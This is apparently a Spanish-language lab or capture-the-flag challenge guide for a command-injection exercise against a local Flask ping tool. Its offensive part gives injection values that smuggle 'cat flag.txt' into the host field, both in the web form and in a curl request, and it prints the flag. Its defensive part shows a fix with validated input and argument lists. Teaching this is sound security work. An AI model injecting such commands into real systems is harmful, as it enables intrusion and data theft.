# Reto 1 — Command Injection (DMZ.10 Diagnostic Tool)

## Contexto
Una herramienta interna de diagnóstico de red en la zona DMZ.10 permite
hacer "ping" a un host desde una interfaz web. El backend ejecuta el
comando del sistema operativo concatenando directamente la entrada del
usuario, sin validarla ni sanitizarla.

## Acceso
- **Aplicación web:** http://localhost:5001
- **Terminal (ttyd):** http://localhost:7681 (usuario `student`, con
  permisos de edición sobre `/app/app.py`)

## Parte ofensiva
1. Abra la aplicación web en `http://localhost:5001`.
2. En el campo de host, en vez de una IP válida, inyecte un comando
   adicional aprovechando que el backend usa `shell=True` / `os.popen`:

   ```
   127.0.0.1; cat flag.txt
   ```

   o equivalentemente:

   ```
   127.0.0.1 && cat flag.txt
   ```

3. La salida del comando (incluyendo el contenido de `flag.txt`) se
   refleja en la página de resultado.
4. También puede probarse vía API (JSON):

   ```bash
   curl -X POST http://localhost:5001/diagnostic \
        -H "Content-Type: application/json" \
        -d '{"host": "127.0.0.1; cat flag.txt"}'
   ```

**Flag:** `FLAG{cmd_1nj3ct10n_dmz_byp4ss}`

## Parte defensiva
1. Conéctese a la terminal web (`http://localhost:7681`).
2. Edite `/app/app.py` (con `nano` o `vim`) y sustituya el bloque
   vulnerable que construye el comando con `os.popen("ping -c 1 " + host)`
   por una ejecución segura con `subprocess.run` usando una **lista** de
   argumentos (nunca una cadena interpretada por el shell), más
   validación de la entrada (regex o el módulo `ipaddress`) para
   rechazar cualquier host que no sea una IP/hostname válido.

   Ejemplo de solución (orientativo, no literal):

   ```python
   import ipaddress
   import subprocess

   def es_host_valido(host: str) -> bool:
       try:
           ipaddress.ip_address(host)
           return True
       except ValueError:
           import re
           return bool(re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host))

   if not es_host_valido(host):
       output = "Host inválido"
   else:
       resultado = subprocess.run(
           ["ping", "-c", "1", host],
           capture_output=True, text=True, timeout=5,
       )
       output = resultado.stdout + resultado.stderr
   ```

3. Flask corre con recarga automática (`debug=True`), por lo que el
   cambio se refleja de inmediato sin reiniciar el contenedor.
4. Verifique que el mismo payload (`127.0.0.1; cat flag.txt`) ya no
   funciona y que un ping legítimo (`127.0.0.1`, `8.8.8.8`) sí responde
   con normalidad.

## Restauración
Para volver al estado inicial (vulnerable) del reto, desde la raíz del
laboratorio ejecute:

```bash
./reset.sh challenge1
```

Esto copia `app.clean/app.py` (la versión vulnerable original) sobre
`app/app.py` y reconstruye el contenedor.
